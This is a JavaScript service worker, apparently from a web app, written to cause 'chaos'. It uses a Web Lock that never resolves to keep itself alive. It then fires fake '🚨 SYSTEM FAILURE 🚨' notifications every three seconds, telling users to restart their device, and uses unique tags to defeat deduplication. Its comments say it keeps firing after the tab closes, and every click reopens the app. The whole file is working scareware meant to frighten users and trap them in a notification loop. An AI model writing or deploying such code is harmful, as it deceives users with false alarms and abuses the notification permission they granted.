self.addEventListener('install', (event) => {
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  event.waitUntil(self.clients.claim());
});

let chaosActive = false;

self.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'START_CHAOS') {
    chaosActive = true;
    startChaosLock();
  }
});

async function startChaosLock() {
  // Use Web Lock API to keep the service worker alive
  if (navigator.locks) {
    navigator.locks.request('chaos_lock', { mode: 'exclusive' }, () => {
      return new Promise(() => {
        // Never resolves! Keeps SW context alive as long as possible
        runNotificationLoop();
      });
    });
  } else {
    runNotificationLoop();
  }
}

function runNotificationLoop() {
  setInterval(async () => {
    if (!chaosActive) return;

    const clients = await self.clients.matchAll();
    
    // Even if there are no clients (tab closed), we keep firing notifications
    // to force them to click and reopen the chaos.
    if (Notification.permission === 'granted') {
      self.registration.showNotification('🚨 SYSTEM FAILURE 🚨', {
        body: 'FATAL ERROR. PLEASE RESTART DEVICE IMMEDIATELY.',
        icon: '/vite.svg', // Assuming vite default icon
        vibrate: [200, 100, 200, 100, 500, 200, 500],
        requireInteraction: true,
        tag: 'chaos-alert-' + Date.now() // Unique tag bypasses deduplication
      });
    }
  }, 3000);
}

self.addEventListener('notificationclick', (event) => {
  event.notification.close();
  // Open a new tab of our chaos app to ensure it keeps running
  event.waitUntil(
    self.clients.matchAll({ type: 'window' }).then((clientList) => {
      // Always open a new window when they click
      if (self.clients.openWindow) {
        return self.clients.openWindow('/?chaos=true');
      }
    })
  );
});
